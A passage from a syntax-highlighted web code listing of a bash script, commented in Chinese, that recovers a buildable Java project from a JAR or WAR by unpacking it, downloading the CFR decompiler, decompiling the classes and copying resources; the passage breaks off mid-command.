class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="comment"># recover-jar.sh — Universal Java/WAR recovery (generic; online + offline POMs)</span></span><br><span class="line"><span class="comment"># 需求：bash、java，推荐有 jar 或 unzip</span></span><br><span class="line"><span class="built_in">set</span> -Eeuo pipefail</span><br><span class="line"></span><br><span class="line"><span class="comment">### ====== 默认参数 / 可通过环境变量覆盖 ======</span></span><br><span class="line">JAR_PATH=<span class="string">&quot;&quot;</span></span><br><span class="line">OUTDIR=<span class="string">&quot;<span class="variable">$&#123;OUTDIR:-recover&#125;</span>&quot;</span></span><br><span class="line">NO_COLOR=<span class="string">&quot;<span class="variable">$&#123;NO_COLOR:-false&#125;</span>&quot;</span></span><br><span class="line">JAVA_RELEASE=<span class="string">&quot;<span class="variable">$&#123;JAVA_RELEASE:-8&#125;</span>&quot;</span>             <span class="comment"># 写入 maven-compiler-plugin &lt;release&gt;</span></span><br><span class="line">GEN_GRADLE_OFFLINE=<span class="string">&quot;<span class="variable">$&#123;GEN_GRADLE_OFFLINE:-false&#125;</span>&quot;</span></span><br><span class="line">CFR_VER=<span class="string">&quot;<span class="variable">$&#123;CFR_VER:-0.152&#125;</span>&quot;</span></span><br><span class="line">SKIP_DECOMPILE=<span class="string">&quot;<span class="variable">$&#123;SKIP_DECOMPILE:-false&#125;</span>&quot;</span></span><br><span class="line"><span class="comment"># 系统化前缀：命中这些 groupId 前缀的依赖，即使有坐标，也写成 systemPath，避免远端解析</span></span><br><span class="line">SYSTEMIZE_PREFIXES=<span class="string">&quot;<span class="variable">$&#123;SYSTEMIZE_PREFIXES:-egovframework.rte,org.egovframe.rte,net.sourceforge.ajaxtags,local.libs&#125;</span>&quot;</span></span><br><span class="line"><span class="comment"># 如果归档内有 POM：主 pom 选择策略：prefer-embedded | auto</span></span><br><span class="line">POM_MODE=<span class="string">&quot;<span class="variable">$&#123;POM_MODE:-prefer-embedded&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">usage</span></span>() &#123;</span><br><span class="line">  <span class="built_in">cat</span> &lt;&lt;<span class="string">&#x27;U&#x27;</span></span><br><span class="line">Usage:</span><br><span class="line">  recover-jar.sh --jar &lt;FILE_or_DIR&gt; [--out DIR] [--no-color]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --jar PATH        指向 JAR/WAR 文件或已解压的目录</span><br><span class="line">  --out DIR         输出目录（默认 recover）</span><br><span class="line">  --no-color        关闭彩色输出</span><br><span class="line">  -h|--<span class="built_in">help</span>         帮助</span><br><span class="line"></span><br><span class="line">ENV:</span><br><span class="line">  JAVA_RELEASE=8|11|17 ...</span><br><span class="line">  GEN_GRADLE_OFFLINE=<span class="literal">true</span>|<span class="literal">false</span></span><br><span class="line">  CFR_VER=0.152</span><br><span class="line">  SKIP_DECOMPILE=<span class="literal">true</span>|<span class="literal">false</span></span><br><span class="line">  SYSTEMIZE_PREFIXES=<span class="string">&quot;egovframework.rte,org.egovframe.rte,net.sourceforge.ajaxtags&quot;</span></span><br><span class="line">  POM_MODE=prefer-embedded|auto</span><br><span class="line">U</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[[ <span class="variable">$#</span> -gt 0 ]] || &#123; usage; <span class="built_in">exit</span> 1; &#125;</span><br><span class="line"><span class="keyword">while</span> [[ <span class="variable">$#</span> -gt 0 ]]; <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">    --jar) JAR_PATH=<span class="string">&quot;<span class="variable">$&#123;2:-&#125;</span>&quot;</span>; <span class="built_in">shift</span> 2;;</span><br><span class="line">    --out) OUTDIR=<span class="string">&quot;<span class="variable">$&#123;2:-&#125;</span>&quot;</span>; <span class="built_in">shift</span> 2;;</span><br><span class="line">    --no-color) NO_COLOR=<span class="literal">true</span>; <span class="built_in">shift</span>;;</span><br><span class="line">    -h|--<span class="built_in">help</span>) usage; <span class="built_in">exit</span> 0;;</span><br><span class="line">    *) <span class="built_in">echo</span> <span class="string">&quot;Unknown arg: <span class="variable">$1</span>&quot;</span> &gt;&amp;2; <span class="built_in">exit</span> 1;;</span><br><span class="line">  <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">[[ -n <span class="string">&quot;<span class="variable">$&#123;JAR_PATH&#125;</span>&quot;</span> ]] || &#123; <span class="built_in">echo</span> <span class="string">&quot;Missing --jar&quot;</span> &gt;&amp;2; <span class="built_in">exit</span> 1; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">### ====== UI ======</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$&#123;NO_COLOR&#125;</span>&quot;</span> == <span class="string">&quot;true&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  OK=<span class="string">&quot;[*]&quot;</span>; WARN=<span class="string">&quot;[!]&quot;</span>; ERR=<span class="string">&quot;[-]&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  OK=$<span class="string">&#x27;\033[0;32m[*]\033[0m&#x27;</span>; WARN=$<span class="string">&#x27;\033[0;33m[!]\033[0m&#x27;</span>; ERR=$<span class="string">&#x27;\033[0;31m[-]\033[0m&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="function"><span class="title">ok</span></span>()&#123; <span class="built_in">echo</span> -e <span class="string">&quot;<span class="variable">$&#123;OK&#125;</span> $*&quot;</span>; &#125;</span><br><span class="line"><span class="function"><span class="title">warn</span></span>()&#123; <span class="built_in">echo</span> -e <span class="string">&quot;<span class="variable">$&#123;WARN&#125;</span> $*&quot;</span>; &#125;</span><br><span class="line"><span class="function"><span class="title">die</span></span>()&#123; <span class="built_in">echo</span> -e <span class="string">&quot;<span class="variable">$&#123;ERR&#125;</span> $*&quot;</span>; <span class="built_in">exit</span> 1; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">### ====== 小工具 ======</span></span><br><span class="line"><span class="function"><span class="title">has</span></span>()&#123; <span class="built_in">command</span> -v <span class="string">&quot;<span class="variable">$1</span>&quot;</span> &gt;/dev/null 2&gt;&amp;1; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">abs</span></span>()&#123;</span><br><span class="line">  <span class="comment"># 跨平台绝对路径</span></span><br><span class="line">  <span class="built_in">local</span> p=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">  <span class="keyword">if</span> [[ -d <span class="string">&quot;<span class="variable">$p</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    (<span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$p</span>&quot;</span> &amp;&amp; <span class="built_in">pwd</span> -P)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">local</span> d; d=<span class="string">&quot;<span class="subst">$(dirname <span class="string">&quot;<span class="variable">$p</span>&quot;</span>)</span>&quot;</span>; <span class="built_in">local</span> f; f=<span class="string">&quot;<span class="subst">$(basename <span class="string">&quot;<span class="variable">$p</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">    (<span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$d</span>&quot;</span> 2&gt;/dev/null &amp;&amp; <span class="built_in">printf</span> <span class="string">&#x27;%s/%s\n&#x27;</span> <span class="string">&quot;<span class="subst">$(pwd -P)</span>&quot;</span> <span class="string">&quot;<span class="variable">$f</span>&quot;</span>) || <span class="built_in">printf</span> <span class="string">&#x27;%s\n&#x27;</span> <span class="string">&quot;<span class="variable">$p</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">join_by</span></span>()&#123; <span class="built_in">local</span> IFS=<span class="string">&quot;<span class="variable">$1</span>&quot;</span>; <span class="built_in">shift</span>; <span class="built_in">echo</span> <span class="string">&quot;$*&quot;</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">trim</span></span>()&#123; <span class="built_in">printf</span> <span class="string">&#x27;%s&#x27;</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> | sed -e <span class="string">&#x27;s/^[[:space:]]\+//&#x27;</span> -e <span class="string">&#x27;s/[[:space:]]\+$//&#x27;</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">should_systemize</span></span>()&#123;</span><br><span class="line">  <span class="comment"># $1=groupId</span></span><br><span class="line">  <span class="built_in">local</span> g=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">  IFS=<span class="string">&#x27;,&#x27;</span> <span class="built_in">read</span> -r -a pf &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$SYSTEMIZE_PREFIXES</span>&quot;</span></span><br><span class="line">  <span class="keyword">for</span> pre <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;pf[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    pre=<span class="string">&quot;<span class="subst">$(trim <span class="string">&quot;<span class="variable">$pre</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">    [[ -z <span class="string">&quot;<span class="variable">$pre</span>&quot;</span> ]] &amp;&amp; <span class="built_in">continue</span></span><br><span class="line">    <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$g</span>&quot;</span> == <span class="string">&quot;<span class="variable">$pre</span>&quot;</span>* ]]; <span class="keyword">then</span> <span class="built_in">return</span> 0; <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">  <span class="built_in">return</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">list_zip</span></span>()&#123;</span><br><span class="line">  <span class="comment"># 列出压缩内文件</span></span><br><span class="line">  <span class="built_in">local</span> f=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">  <span class="keyword">if</span> has jar; <span class="keyword">then</span> jar tf <span class="string">&quot;<span class="variable">$f</span>&quot;</span>; <span class="keyword">else</span> unzip -Z1 <span class="string">&quot;<span class="variable">$f</span>&quot;</span>; <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">extract_one</span></span>()&#123;</span><br><span class="line">  <span class="comment"># 从压缩里提取单个文件到目标（保留目录）</span></span><br><span class="line">  <span class="built_in">local</span> f=<span class="string">&quot;<span class="variable">$1</span>&quot;</span> inner=<span class="string">&quot;<span class="variable">$2</span>&quot;</span> outdir=<span class="string">&quot;<span class="variable">$3</span>&quot;</span></span><br><span class="line">  <span class="keyword">if</span> has jar; <span class="keyword">then</span></span><br><span class="line">    (<span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$outdir</span>&quot;</span> &amp;&amp; jar xf <span class="string">&quot;<span class="variable">$f</span>&quot;</span> <span class="string">&quot;<span class="variable">$inner</span>&quot;</span>) || <span class="literal">true</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$outdir</span>&quot;</span></span><br><span class="line">    unzip -qq <span class="string">&quot;<span class="variable">$f</span>&quot;</span> <span class="string">&quot;<span class="variable">$inner</span>&quot;</span> -d <span class="string">&quot;<span class="variable">$outdir</span>&quot;</span> &gt;/dev/null 2&gt;&amp;1 || <span class="literal">true</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">### ====== 路径布局 ======</span></span><br><span class="line">JAR_ABS=<span class="string">&quot;<span class="subst">$(abs <span class="string">&quot;<span class="variable">$&#123;JAR_PATH&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">OUT_ABS=<span class="string">&quot;<span class="subst">$(abs <span class="string">&quot;<span class="variable">$&#123;OUTDIR&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">STAGE=<span class="string">&quot;<span class="variable">$&#123;OUT_ABS&#125;</span>/.stage&quot;</span></span><br><span class="line">PROJ=<span class="string">&quot;<span class="variable">$&#123;OUT_ABS&#125;</span>/project&quot;</span></span><br><span class="line">SRC=<span class="string">&quot;<span class="variable">$&#123;PROJ&#125;</span>/src/main/java&quot;</span></span><br><span class="line">RES=<span class="string">&quot;<span class="variable">$&#123;PROJ&#125;</span>/src/main/resources&quot;</span></span><br><span class="line">WEB=<span class="string">&quot;<span class="variable">$&#123;PROJ&#125;</span>/src/main/webapp&quot;</span></span><br><span class="line">LIB=<span class="string">&quot;<span class="variable">$&#123;PROJ&#125;</span>/lib&quot;</span></span><br><span class="line">TOOLS=<span class="string">&quot;<span class="variable">$&#123;OUT_ABS&#125;</span>/tools&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="string">&quot;<span class="variable">$&#123;OUT_ABS&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;SRC&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;RES&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;LIB&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;TOOLS&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;PROJ&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">has java || die <span class="string">&quot;Need &#x27;java&#x27; (JDK) in PATH&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### ====== 解包 ======</span></span><br><span class="line"><span class="keyword">if</span> [[ -d <span class="string">&quot;<span class="variable">$&#123;JAR_ABS&#125;</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  ok <span class="string">&quot;Use exploded directory&quot;</span></span><br><span class="line">  <span class="comment"># 尽量保持符号链接 &amp; 权限</span></span><br><span class="line">  <span class="keyword">if</span> has rsync; <span class="keyword">then</span> rsync -a --delete <span class="string">&quot;<span class="variable">$&#123;JAR_ABS&#125;</span>/&quot;</span> <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/&quot;</span>; <span class="keyword">else</span> <span class="built_in">cp</span> -R <span class="string">&quot;<span class="variable">$&#123;JAR_ABS&#125;</span>/.&quot;</span> <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/&quot;</span>; <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  ok <span class="string">&quot;Unpack archive&quot;</span></span><br><span class="line">  <span class="built_in">cp</span> <span class="string">&quot;<span class="variable">$&#123;JAR_ABS&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/app.bin&quot;</span></span><br><span class="line">  (</span><br><span class="line">    <span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">if</span> has jar; <span class="keyword">then</span> jar xf app.bin || <span class="literal">true</span>; <span class="keyword">else</span> unzip -qq app.bin || <span class="literal">true</span>; <span class="keyword">fi</span></span><br><span class="line">  )</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### ====== 归档类型检测 ======</span></span><br><span class="line">IS_WAR=<span class="string">&quot;false&quot;</span>; IS_BOOT=<span class="string">&quot;false&quot;</span></span><br><span class="line">[[ -d <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/WEB-INF&quot;</span> ]] &amp;&amp; IS_WAR=<span class="string">&quot;true&quot;</span></span><br><span class="line"><span class="keyword">if</span> [[ -d <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/BOOT-INF/classes&quot;</span> &amp;&amp; -d <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/BOOT-INF/lib&quot;</span> ]]; <span class="keyword">then</span> IS_BOOT=<span class="string">&quot;true&quot;</span>; <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### ====== 下载 CFR（可选） ======</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$&#123;SKIP_DECOMPILE&#125;</span>&quot;</span> != <span class="string">&quot;true&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [[ ! -f <span class="string">&quot;<span class="variable">$&#123;TOOLS&#125;</span>/cfr.jar&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    ok <span class="string">&quot;Download CFR <span class="variable">$&#123;CFR_VER&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">if</span> has curl; <span class="keyword">then</span> curl -fsSL -o <span class="string">&quot;<span class="variable">$&#123;TOOLS&#125;</span>/cfr.jar&quot;</span> <span class="string">&quot;https://www.benf.org/other/cfr/cfr-<span class="variable">$&#123;CFR_VER&#125;</span>.jar&quot;</span> || warn <span class="string">&quot;CFR download failed&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> has wget; <span class="keyword">then</span> wget -q -O <span class="string">&quot;<span class="variable">$&#123;TOOLS&#125;</span>/cfr.jar&quot;</span> <span class="string">&quot;https://www.benf.org/other/cfr/cfr-<span class="variable">$&#123;CFR_VER&#125;</span>.jar&quot;</span> || warn <span class="string">&quot;CFR download failed&quot;</span></span><br><span class="line">    <span class="keyword">else</span> warn <span class="string">&quot;No curl/wget; skip decompile&quot;</span>; <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### ====== 反编译（若可） ======</span></span><br><span class="line"><span class="function"><span class="title">pack_and_decompile</span></span>()&#123;</span><br><span class="line">  <span class="built_in">local</span> classes_dir=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">  [[ -d <span class="string">&quot;<span class="variable">$&#123;classes_dir&#125;</span>&quot;</span> ]] || <span class="built_in">return</span> 0</span><br><span class="line">  [[ -f <span class="string">&quot;<span class="variable">$&#123;TOOLS&#125;</span>/cfr.jar&quot;</span> ]] || <span class="built_in">return</span> 0</span><br><span class="line">  ok <span class="string">&quot;Decompile <span class="variable">$&#123;classes_dir&#125;</span>&quot;</span></span><br><span class="line">  <span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/tmpc&quot;</span></span><br><span class="line">  (</span><br><span class="line">    <span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$&#123;classes_dir&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">if</span> has jar; <span class="keyword">then</span> jar cf <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/tmpc/classes-only.jar&quot;</span> .; <span class="keyword">else</span> zip -qr <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/tmpc/classes-only.jar&quot;</span> . &gt;/dev/null; <span class="keyword">fi</span></span><br><span class="line">  )</span><br><span class="line">  java -jar <span class="string">&quot;<span class="variable">$&#123;TOOLS&#125;</span>/cfr.jar&quot;</span> <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/tmpc/classes-only.jar&quot;</span> --outputdir <span class="string">&quot;<span class="variable">$&#123;SRC&#125;</span>&quot;</span> --silent <span class="literal">true</span> &gt;/dev/null 2&gt;&amp;1 || <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$&#123;SKIP_DECOMPILE&#125;</span>&quot;</span> != <span class="string">&quot;true&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$&#123;IS_BOOT&#125;</span>&quot;</span> == <span class="string">&quot;true&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    pack_and_decompile <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/BOOT-INF/classes&quot;</span></span><br><span class="line">  <span class="keyword">elif</span> [[ <span class="string">&quot;<span class="variable">$&#123;IS_WAR&#125;</span>&quot;</span> == <span class="string">&quot;true&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    pack_and_decompile <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/WEB-INF/classes&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment"># 尝试找 classes</span></span><br><span class="line">    <span class="keyword">if</span> [[ -d <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/classes&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">      pack_and_decompile <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/classes&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      :</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### ====== 资源拷贝（覆盖模板/静态/公共路径） ======</span></span><br><span class="line"><span class="function"><span class="title">copy_resources_from_root</span></span>()&#123;</span><br><span class="line">  <span class="comment"># $1=root（如 BOOT-INF/classes 或 WEB-INF/classes 或 .）</span></span><br><span class="line">  <span class="built_in">local</span> root=<span class="string">&quot;<span class="variable">$1</span>&quot;</span>; [[ -d <span class="string">&quot;<span class="variable">$root</span>&quot;</span> ]] || <span class="built_in">return</span> 0</span><br><span class="line">  ok <span class="string">&quot;Copy resources from <span class="variable">$root</span>&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Spring Boot 惯例目录</span></span><br><span class="line">  <span class="keyword">for</span> d <span class="keyword">in</span> templates static public META-INF/resources; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [[ -d <span class="string">&quot;<span class="variable">$&#123;root&#125;</span>/<span class="variable">$&#123;d&#125;</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$&#123;RES&#125;</span>/<span class="variable">$&#123;d&#125;</span>&quot;</span></span><br><span class="line">      <span class="keyword">if</span> has rsync; <span class="keyword">then</span> rsync -a <span class="string">&quot;<span class="variable">$&#123;root&#125;</span>/<span class="variable">$&#123;d&#125;</span>/&quot;</span> <span class="string">&quot;<span class="variable">$&#123;RES&#125;</span>/<span class="variable">$&#123;d&#125;</span>/&quot;</span></span><br><span class="line">      <span class="keyword">else</span> (<span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$&#123;root&#125;</span>/<span class="variable">$&#123;d&#125;</span>&quot;</span> &amp;&amp; find . -<span class="built_in">type</span> f -print0 | <span class="keyword">while</span> IFS= <span class="built_in">read</span> -r -d <span class="string">&#x27;&#x27;</span> f; <span class="keyword">do</span> <span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$&#123;RES&#125;</span>/<span class="variable">$&#123;d&#125;</span>/<span class="subst">$(dirname <span class="string">&quot;<span class="variable">$f</span>&quot;</span>)</span>&quot;</span>; <span class="built_in">cp</span> -f <span class="string">&quot;<span class="variable">$f</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;RES&#125;</span>/<span class="variable">$&#123;d&#125;</span>/<span class="variable">$f</span>&quot;</span>; <span class="keyword">done</span>)</span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 常见资源后缀（兜底，避免漏掉位于根包里的 html/css/js/图片/字体等）</span></span><br><span class="line">  (</span><br><span class="line">    <span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$&#123;root&#125;</span>&quot;</span></span><br><span class="line">    find . -<span class="built_in">type</span> f ! -name <span class="string">&#x27;*.class&#x27;</span> \</span><br><span class="line">      \( -iname <span class="string">&#x27;*.properties&#x27;</span> -o -iname <span class="string">&#x27;*.yml&#x27;</span> -o -iname <span class="string">&#x27;*.yaml&#x27;</span> -o -iname <span class="string">&#x27;*.xml&#x27;</span> -o -iname <span class="string">&#x27;*.json&#x27;</span> -o -iname <span class="string">&#x27;*.txt&#x27;</span> \</span><br><span class="line">         -o -iname <span class="string">&#x27;*.html&#x27;</span> -o -iname <span class="string">&#x27;*.htm&#x27;</span> -o -iname <span class="string">&#x27;*.ftl&#x27;</span> -o -iname <span class="string">&#x27;*.vm&#x27;</span> \</span><br><span class="line">         